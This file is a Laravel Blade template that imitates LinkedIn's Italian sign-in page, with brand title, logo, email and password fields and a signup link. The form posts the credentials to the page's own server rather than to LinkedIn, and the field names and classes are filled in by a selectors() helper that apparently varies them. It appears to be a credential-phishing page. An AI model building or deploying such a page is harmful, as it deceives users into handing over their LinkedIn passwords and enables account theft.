<!DOCTYPE html>

@php
    $selectors = selectors();
@endphp

<html lang="{{ $selectors['lang'] }}" dir="{{ $selectors['dir'] }}">
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
    <meta charset="{{ $selectors['charset'] }}" />
    <meta name="author" content="{{ $selectors['author'] }}" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Accesso a LinkedIn, Accesso | LinkedIn</title>
    <link rel="stylesheet" type="text/css" href="{{ asset("css/app.css") }}" />
    <link rel="stylesheet" type="text/css" href="/css/login/index.css" />
    <link rel="shortcut icon" href="/img/favicon.ico" />
</head>
<body>
<div class="{{ $selectors['container'] }}">
    <div class="{{ $selectors['col'] }}5">
        <div class="{{ $selectors['row'] }}">
            <div class="col-xs-12 col-sm-10 col-md-8 col-lg-6 col-xl-4">
                <div class="{{ $selectors['row'] }} justify-content-xl-start">
                    <a class="text-decoration-none" href="/">
                        <h2 class="primaryTXT {{ $selectors['fw'] }} ml-xl-3">
                            Linked<i class="fab fa-linkedin ml-1"></i>
                        </h2>
                    </a>
                </div>
                <div class="{{ $selectors['row'] }} mt-3">
                    <div id="card" class="p-5">
                        <div class="col-12" id="header">
                            <div class="row">
                                <h2 class="">Accedi</h2>
                            </div>
                            <div class="row">
                                <p>Resta al passo con il tuo mondo professionale.</p>
                            </div>
                        </div>
                        <form method="POST" class="" action="/">
                            <div class="col-12">
                                <div class="row">
                                    <input
                                            name="{{ $selectors['email'] }}"
                                            type="text"
                                            class="{{ $selectors['input'] }}"
                                            autocomplete='off'
                                            placeholder="{{ ucfirst($selectors['email']) }}"
                                            required
                                    />
                                    <!-- <label class="" for="Email">Email</label>-->
                                </div>
                            </div>
                            <div class="{{ $selectors['col'] }}4">
                                <div class="row">
                                    <input
                                            type="{{ $selectors['pass'] }}"
                                            id="{{ $selectors['pass'] }}"
                                            name="{{ $selectors['pass'] }}"
                                            class="{{ $selectors['input'] }}"
                                            placeholder="{{ ucfirst($selectors['pass']) }}"
                                            title="Clicca per Mostrare / Nascondere la Password"
                                            required
                                    />
                                    <!-- <label for="password" class="form__label--floating" aria-hidden="true">Password</label>-->
                                    <!--<span class="" id="show" role="button">mostra</span>-->
                                </div>
                            </div>
                            <div class="{{ $selectors['col'] }}3 ml-2">
                                <div class="row">
                                    <a href="/">
                                        <h6 id="passwordDimenticata" class="primaryTXT">
                                            Hai dimenticato la password?
                                        </h6>
                                    </a>
                                </div>
                            </div>
                            <div class="{{ $selectors['col'] }}3">
                                <div class="row">
                                    <button
                                            id="accediBTN"
                                            class="{{ $selectors['btn'] }} {{ $selectors['fw'] }} {{ $selectors['col'] }} primaryBG p-2"
                                            type="submit">
                                        Accedi
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                    <div class="{{ $selectors['col'] }}5">
                        <div class="{{ $selectors['row'] }}">
                            <span id="footer">
                                Nuovo utente di LinkedIn?
                                <a href="/">
                                    <b class="primaryTXT">
                                        Iscriviti ora
                                    </b>
                                </a>
                            </span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<script src="{{asset('js/app.js')}}"></script>
<script type="text/javascript" src="js/login/index.js"></script>
</body>
</html>